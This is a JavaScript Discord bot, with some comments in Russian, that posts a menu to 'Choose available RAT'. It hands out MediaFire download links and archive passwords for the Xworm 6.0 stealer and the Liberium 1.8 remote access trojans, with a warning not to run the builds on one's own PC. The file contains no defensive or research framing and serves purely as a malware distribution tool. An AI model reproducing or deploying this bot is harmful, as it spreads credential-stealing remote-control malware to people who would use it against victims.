const { 
  Client, GatewayIntentBits, Events, 
  ActionRowBuilder, StringSelectMenuBuilder, 
  ButtonBuilder, EmbedBuilder, AttachmentBuilder 
} = require('discord.js');
require('dotenv').config();

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

client.once(Events.ClientReady, () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

client.on(Events.InteractionCreate, async (interaction) => {
  if (!interaction.isStringSelectMenu()) return;
  if (interaction.customId !== 'select_rat') return;

  const selected = interaction.values[0];

  if (selected === 'xworm') {
    const embed = new EmbedBuilder()
      .setTitle('Banan - File Manager\nXworm 6.0')
      .setDescription(
        'The same Xworm 5.6 but with better plugins.\n\n' +
        '**WARNING:** DONT START YOUR BUILD ON YOUR PC\n\n' +
        '**Password:** `Banan`'
      )
      .setColor(0x2f3136)
      .setImage('attachment://xworm_preview.png');

    const preview = new AttachmentBuilder('./xworm_preview.png');
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel('Download ⬇️')
        .setStyle(5)
            .setURL('https://www.mediafire.com/file/35sg1njb9ujg0ub/xworm6.0.rar/file')
    );

    await interaction.reply({
      embeds: [embed],
      files: [preview],
      components: [row],
      ephemeral: true,
    });
  }

  if (selected === 'liberium') {
    const embed = new EmbedBuilder()
      .setTitle('Banan - File Manager\nLiberium 1.8 Fixed')
      .setDescription(
        'Stable version of Liberium 1.8 and plugins.\n\n' +
        '**Password:** `Banan`'
      )
      .setColor(0x2f3136)
      .setImage('attachment://liberium_preview.png');

    const preview = new AttachmentBuilder('./liberium_preview.png');
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setLabel('Download ⬇️')
        .setStyle(5)
            .setURL('https://www.mediafire.com/file/nsqc5931l5ythu9/LiberFixed.rar/file')
    );

    await interaction.reply({
      embeds: [embed],
      files: [preview],
      components: [row],
      ephemeral: true,
    });
  }
});

client.on(Events.ClientReady, async () => {
    console.log(`✅ Бот запущен как ${client.user.tag}`);

    const channel = await client.channels.fetch('1403159424746524682'); // ID твоего канала
    if (!channel) return;

    // Удаляем старые сообщения бота с меню
    const messages = await channel.messages.fetch({ limit: 1 });
    const botMessages = messages.filter(msg => msg.author.id === client.user.id);
    for (const msg of botMessages.values()) {
        await msg.delete().catch(() => { });
    }

    // Создаем меню
    const row = new ActionRowBuilder().addComponents(
        new StringSelectMenuBuilder()
            .setCustomId('select_rat')
            .setPlaceholder('Choose available RAT')
            .addOptions([
                {
                    label: 'Xworm 6.0',
                    description: 'Stealer + DLL Reader Plugins',
                    value: 'xworm',
                },
                {
                    label: 'Liberium 1.8 Fixed',
                    description: 'RAT with upgrades',
                    value: 'liberium',
                },
            ])
    );

    // Отправляем новое меню
    await channel.send({
        content: 'Choose your RAT to get download link and get Preview',
        components: [row],
    });

    console.log(`📩 Меню обновлено в канале ${channel.name}`);
});


client.login(process.env.BOT_TOKEN);
